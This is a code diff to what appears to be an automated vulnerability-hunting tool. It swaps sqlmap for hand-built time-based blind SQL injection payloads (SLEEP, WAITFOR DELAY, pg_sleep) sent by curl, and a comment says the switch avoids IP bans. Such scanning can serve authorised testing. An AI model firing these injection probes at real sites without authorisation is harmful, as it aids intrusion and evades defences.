@@ -127,20 +127,31 @@ class HuntPhase(BasePhase):
                    self._parse_sqli_candidates,
                    "vulnerabilities")
         
-        # Step B: 对候选 URL 用 sqlmap 验证（限制 level/risk 避免太慢）
+        # Step B: 对候选 URL 用手动时间盲注验证（不用sqlmap，避免封IP）
         sqli_urls = [v.get('url', '') for v in phase_findings["vulnerabilities"] 
                     if v.get('type') == 'SQLi (候选)'][:5]
         
         if sqli_urls:
+            console.print(f"    对 {len(sqli_urls)} 个候选做时间盲注验证（手动，不用sqlmap）...")
+            time_payloads = [
+                ("' AND SLEEP(5)-- -", 5),
+                ("' OR SLEEP(5)-- -", 5),
+                ("1' WAITFOR DELAY '0:0:5'-- -", 5),  # MSSQL
+                ("' AND pg_sleep(5)-- -", 5),  # PostgreSQL
+            ]
             for url in sqli_urls:
                 safe_url = sanitize_url(url)
-                self._step(f"sqlmap验证: {url[:50]}", target, phase_findings, findings,
-                           f"sqlmap -u {shell_quote(safe_url)} --batch --level=2 --risk=2 "
-                           f"--threads=3 --timeout=15 --retries=1 --random-agent "
-                           f"--technique=BEU --smart 2>/dev/null | "
-                           f"grep -iE 'injectable|parameter|payload|is vulnerable' | head -10",
-                           self._parse_sqlmap,
-                           "vulnerabilities")
+                for payload, delay in time_payloads[:2]:
+                    test_url = re.sub(r'(=)[^&]*', f'\\1{payload}', safe_url, count=1)
+                    self._step(f"SQLi时间盲注: {url[:40]}", target, phase_findings, findings,
+                               f"start=$(date +%s); "
+                               f"curl -s --max-time 12 {shell_quote(test_url)} > /dev/null 2>&1; "
+                               f"end=$(date +%s); "
+                               f"elapsed=$((end - start)); "
+                               f'[ $elapsed -ge {delay} ] && echo "SQLI_TIME_CONFIRMED: {url} (${{elapsed}}s)" || '
+                               f'echo "NO (${{elapsed}}s)"',
+                               self._parse_sqli_result,
+                               "vulnerabilities")
         
         # Step C: gf sqli 模式补充（从URL模式匹配）
         all_urls = findings.get('urls', [])[:200]
@@ -367,22 +378,9 @@ class HuntPhase(BasePhase):
                     "type": "SQLi (候选)",
                     "url": url,
                     "severity": "high",
-                    "detail": "单引号触发SQL错误响应，需sqlmap确认"
+                    "detail": "单引号触发SQL错误响应，需时间盲注确认"
                 })
                 self.logger.log_event("FINDING", f"⚠️ SQLi候选: {url[:80]}")
-        return vulns
-    
-    def _parse_sqlmap(self, output: str) -> list:
-        """解析 sqlmap 输出"""
-        vulns = []
-        if any(kw in output.lower() for kw in ['injectable', 'is vulnerable', 'payload']):
-            vulns.append({
-                "type": "SQLi (confirmed)",
-                "url": "见sqlmap日志",
-                "severity": "critical",
-                "detail": output[:300]
-            })
-            self.logger.log_event("FINDING", f"🔥 SQLi确认! {output[:100]}")
         return vulns
     
     def _parse_ssrf(self, output: str) -> list:
